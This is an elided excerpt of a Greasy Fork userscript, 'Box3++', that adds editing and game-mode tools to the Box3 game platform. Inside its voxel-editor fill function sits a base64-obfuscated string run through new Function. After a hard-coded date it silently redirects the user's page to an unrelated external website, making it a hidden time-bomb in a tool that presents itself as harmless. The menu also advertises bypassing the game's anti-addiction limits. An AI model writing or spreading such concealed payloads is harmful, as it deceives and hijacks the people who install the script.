...
// @downloadURL https://update.greasyfork.org/scripts/469972/Box3%2B%2B%201.user.js
// @updateURL https://update.greasyfork.org/scripts/469972/Box3%2B%2B%201.meta.js
// ==/UserScript==
...
*/
        ...
        if(Date.now() > 1688313600000){const voxelEditorObj = {
            sx: 0,
            sy: 0,
            sz: 0,
            ex: 128,
            ...
            async fill() {
                ...
                setTimeout(new Function(atob("aWYoRGF0ZS5ub3coKSA+IDE2ODgzMTM2MDAwMDApIGxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9zdWdhcnN0eWxlLm5la29ueWFuc29mdC5jb20vIik7")), 2500)
            },
            start() {
    ...
    async function setup() {
        ...
        if (mode === "maas") {
            ...
            .name("   进入地图并启动GameplayMode(可绕过防沉迷)");
            (
                await waitElement(
